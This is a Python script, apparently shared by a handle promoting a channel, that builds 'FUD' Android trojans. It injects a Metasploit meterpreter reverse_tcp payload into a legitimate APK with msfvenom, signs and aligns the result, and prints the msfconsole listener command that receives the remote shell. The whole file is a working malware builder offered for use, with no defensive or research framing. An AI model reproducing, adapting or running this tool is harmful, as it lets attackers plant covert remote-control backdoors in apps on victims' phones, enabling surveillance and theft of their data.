#!/usr/bin/env python3
# Devils Will Rise – Instant FUD APK Builder
# Owner @UnknownGuy9876 | Channel @SGCodexs
# Usage: python instant_fud.py input.apk [output.apk]

import os
import sys
import subprocess
import shutil
import tempfile
import argparse

# ========== CONFIG (Change these) ==========
LHOST = "  192.168.31.222"      # Your listener IP
LPORT = 4444                 # Your listener port
# ===========================================

def check_tool(name):
    return shutil.which(name) is not None

def run_cmd(cmd, capture=False):
    print(f"[*] Running: {cmd}")
    if capture:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    else:
        subprocess.check_call(cmd, shell=True)

def build_fud(input_apk, output_apk):
    if not os.path.exists(input_apk):
        print(f"[-] Input APK not found: {input_apk}")
        sys.exit(1)

    if not check_tool("msfvenom"):
        print("[-] msfvenom not found. Install Metasploit Framework.")
        print("    Windows: download from https://www.metasploit.com/")
        print("    Linux: sudo apt install metasploit-framework")
        sys.exit(1)

    temp_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
    try:
        cmd = f"msfvenom -x {input_apk} -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {temp_apk}"
        run_cmd(cmd)
        if not os.path.exists(temp_apk) or os.path.getsize(temp_apk) == 0:
            print("[-] msfvenom injection failed (empty output).")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[-] msfvenom error: {e}")
        sys.exit(1)

    if check_tool("jarsigner"):
        keystore = "devil.keystore"
        if not os.path.exists(keystore):
            print("[*] Generating keystore...")
            run_cmd(f"keytool -genkey -alias devil -keystore {keystore} -storepass 123456 -keypass 123456 -dname 'CN=Devil' -validity 10000")
        try:
            run_cmd(f"jarsigner -verbose -keystore {keystore} -storepass 123456 -keypass 123456 {temp_apk} devil")
        except subprocess.CalledProcessError as e:
            print(f"[!] jarsigner warning (may still work): {e}")
    else:
        print("[!] jarsigner not found – APK will be unsigned (may not install on some devices)")

    if check_tool("zipalign"):
        aligned_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
        try:
            run_cmd(f"zipalign -v 4 {temp_apk} {aligned_apk}")
            shutil.move(aligned_apk, output_apk)
            os.remove(temp_apk) if os.path.exists(temp_apk) else None
        except subprocess.CalledProcessError:
            print("[!] zipalign failed, using unaligned APK.")
            shutil.move(temp_apk, output_apk)
    else:
        print("[!] zipalign not found – skipping alignment.")
        shutil.move(temp_apk, output_apk)

    print(f"[+] FUD APK created: {output_apk}")
    print(f"[*] Listener command: msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit'")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Instant FUD APK Builder")
    parser.add_argument("input", help="Input APK file")
    parser.add_argument("output", nargs="?", default=None, help="Output APK file (default: input_fud.apk)")
    args = parser.parse_args()

    output = args.output if args.output else args.input.replace(".apk", "_fud.apk")
    build_fud(args.input, output)